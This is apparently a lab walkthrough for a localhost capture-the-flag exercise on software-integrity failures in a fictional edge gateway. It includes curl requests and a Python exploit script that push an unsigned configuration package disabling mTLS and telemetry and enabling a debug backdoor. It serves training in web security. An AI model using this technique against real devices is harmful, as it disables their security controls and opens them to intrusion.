# Practical Walkthrough: Exploitation & Verification (A08)

This guide walks you through the practical discovery, exploitation, and verification of Software and Data Integrity Failures on the **Zitera Edge Gateway (Port 8018)**. You will test unverified package ingestion, hot-load tampered configurations into active memory, and audit the system state.

---

## 4-Tier Mission Progression Methodology

```
[Tier 1: Observation (15%)] ──> [Tier 2: Fault Injection (25%)] ──> [Tier 3: Weaponization (35%)] ──> [Tier 4: Verification (25%)]
   Inspect Factory Default         Send Unsigned Configuration         Inject Backdoor & Mutate         Verify Lab Objective &
        Parameters                            Payload                        Active Memory                   Reset System State
```

---

## Tier 1: Observation & Attack Surface Mapping (15%)

Begin by probing the baseline operational parameters running on the edge gateway.

### 1.1 Service Health Probe (Manual cURL)
Query the service health probe endpoint:

```bash
curl -i -s http://localhost:8018/health
```

Expected response:
```json
{"status": "ok", "lab": "A08", "port": 8018}
```

### 1.2 Fetch Factory Default Configuration (Manual cURL)
Retrieve the active runtime parameters currently loaded in memory:

```bash
curl -i -s http://localhost:8018/api/config
```

The response reveals the factory-initialized configuration signed by the root authority:
```json
{
  "version": "1.0.0",
  "signature_verified": true,
  "signer": "zitera-root-authority",
  "params": {
    "telemetry_level": "standard",
    "enforce_mtls": true
  }
}
```

Notice that `enforce_mtls: true` is currently enforced, and the active signer is `zitera-root-authority`.

---

## Tier 2: Fault Injection & Anomaly Testing (25%)

Now, test whether the ingestion handler validates cryptographic authenticity when receiving new configuration packages via `POST /api/deploy_update`.

### 2.1 Submit Unverified Configuration Package (Manual cURL)
Transmit an HTTP POST request declaring that the digital signature is **unverified**:

```bash
curl -i -X POST http://localhost:8018/api/deploy_update \
  -H "Content-Type: application/json" \
  -d '{
    "version": "2.0.0-custom",
    "signature_verified": false,
    "signer": "unverified-external-source",
    "params": {
      "enforce_mtls": false
    }
  }'
```

### 2.2 Response Inspection
The server responds with `HTTP/1.0 200 OK`:
```json
{
  "status": "applied",
  "message": "Configuration package deployed directly into memory.",
  "active_config": {
    "version": "2.0.0-custom",
    "signature_verified": false,
    "signer": "unverified-external-source",
    "params": {
      "enforce_mtls": false
    }
  }
}
```

The gateway did not reject the package despite `"signature_verified": false`. The unauthenticated payload was directly committed to operational memory!

---

## Tier 3: Weaponization & Backdoor Injection (35%)

Having verified the complete absence of cryptographic enforcement, automate the delivery of a malicious configuration that disables security telemetry and injects an operational backdoor (`debug_backdoor: true`).

### 3.1 Automated Exploitation Script (`exploit_integrity.py`)

Create and run the following Python automation script:

```python
import json
import urllib.request

TARGET_URL = "http://localhost:8018/api/deploy_update"

malicious_package = {
    "version": "9.9.9-malicious",
    "signature_verified": False,
    "signer": "adversary-control-node",
    "params": {
        "telemetry_level": "disabled",
        "enforce_mtls": False,
        "debug_backdoor": True
    }
}

req = urllib.request.Request(
    TARGET_URL,
    data=json.dumps(malicious_package).encode("utf-8"),
    headers={"Content-Type": "application/json"},
    method="POST"
)

try:
    with urllib.request.urlopen(req) as response:
        body = response.read().decode("utf-8")
        result = json.loads(body)
        print("[+] Response Status:", response.status)
        print("[+] Applied Active Config:", json.dumps(result.get("active_config"), indent=2))
        if "flag" in result:
            print("[+] Challenge Flag Successfully Captured!")
            print("[+] Flag:", result["flag"])
except Exception as e:
    print("[-] Exploit delivery failed:", e)
```

Execute the script:
```bash
python exploit_integrity.py
```

The gateway responds confirming memory alteration and reveals the proof-of-compromise challenge flag (`ZITERA{...}`).

---

## Tier 4: Verification & Defensive State Audit (25%)

### 4.1 Automated Lab Target Verification
Audit your progress using the automated practice verification endpoint:

```bash
curl -s http://localhost:8018/practice/verify
```

Expected verification response:
```json
{
  "status": "passed",
  "message": "Software integrity failure demonstrated: System accepted unverified/tampered configuration package into active runtime!"
}
```

### 4.2 Factory State Reset
Restore the edge device to its trusted baseline state:

```bash
curl -X POST http://localhost:8018/api/reset
```

Confirm restoration:
```bash
curl -s http://localhost:8018/api/config
```
The active configuration should reflect `"signature_verified": true` and `"enforce_mtls": true`.
